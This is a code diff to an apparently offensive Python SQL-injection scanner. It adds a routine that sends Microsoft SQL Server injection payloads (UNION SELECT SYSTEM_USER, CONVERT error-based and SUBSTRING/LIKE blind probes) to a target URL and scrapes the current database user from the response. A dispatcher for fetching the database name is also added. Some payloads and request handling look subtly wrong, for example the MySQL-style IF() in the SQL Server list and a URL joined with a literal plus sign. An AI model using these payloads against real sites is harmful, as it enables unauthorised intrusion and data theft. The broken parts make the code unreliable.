@@ -41,8 +41,25 @@ class SQLInjectionScanner:
         return db_type
 
     async def get_database_name(self):
-        print('')
+        print(f"Getting database name for {self.database_type} database...")
 
+        if self.database_type == "MySQL":
+            await self.perform_mysql_get_database_name()
+        elif self.database_type == "PostGre":
+            await self.perform_postgre_get_database_name()
+        elif self.database_type == "Microsoft_SQL":
+            await self.perform_microsoftsql_get_database_name()
+        elif self.database_type == "Oracle":
+            await self.perform_oracle_get_database_name()
+        elif self.database_type == "Advantage_Database":
+            await self.perform_advantage_get_database_name()
+        elif self.database_type == "Firebird":
+            await self.perform_firebird_get_database_name()
+        else:
+            print(f"Unsupported database type: {self.database_type}")
+
+
+# Get Current User
     async def get_current_user(self):
         print(f"Getting current user for {self.database_type} database...")
 
@@ -61,8 +78,34 @@ class SQLInjectionScanner:
         else:
             print(f"Unsupported database type: {self.database_type}")
 
+# Get Current user based on DB Type
     async def perform_microsoftsql_get_current_user(self):
         print("Microsoft SQL Server: Retrieving current user...")
+        async with aiohttp.ClientSession() as session:
+            unique_responses = set()
+
+            for query in [
+                f"1' UNION SELECT null, SYSTEM_USER, null; --",
+                f"1' OR 1=CONVERT(int, (SELECT SYSTEM_USER)); --",
+                f"1' OR IF(1=1, SYSTEM_USER, 0) --",
+                f"1' OR 1=CONVERT(int, (SELECT CURRENT_USER)); --",
+                f"1' OR SUBSTRING((SELECT CURRENT_USER), 1, 1) = 'a'; --",
+                f"1' OR IF(1=1, (SELECT CURRENT_USER LIKE 'a%'), 0); --",
+            ]:
+                post_data = {}
+                full_url = f'{self.target_url}+{query}'
+
+                try:
+                    async with session.post(full_url, data=post_data) as response:
+                        result = await response.text()
+                        soup = BS(result, 'html.parser')
+                        current_user = soup.find('div', class_='current-user').text
+
+                        if current_user not in unique_responses:
+                            unique_responses.add(current_user)
+                            print(f"Microsoft SQL Server: Retrieving current user response for query '{query}': {current_user}")
+                except Exception as e:
+                    print(f"Microsoft SQL Server: Error performing POST request for query '{query}': {e}")
 
     async def perform_firebird_get_current_user(self):
         print("Firebird: Retrieving current user...")
@@ -207,6 +250,7 @@ class SQLInjectionScanner:
                             print(f"MySQL: Retrieving current user response for query '{query}': {current_user}")
                 except Exception as e:
                     print(f"MySQL: Error performing POST request for query '{query}': {e}")
+############################################################################################################################
 
     @classmethod
     async def create(cls, target_url):
@@ -217,6 +261,7 @@ class SQLInjectionScanner:
             await scanner.get_current_user()
         else:
             print(f"Could not find a vulnerability...")
+            
 async def main():
     parser = argparse.ArgumentParser(description="SQL Injection Scanner")
     parser.add_argument("target_url", help="Target URL")
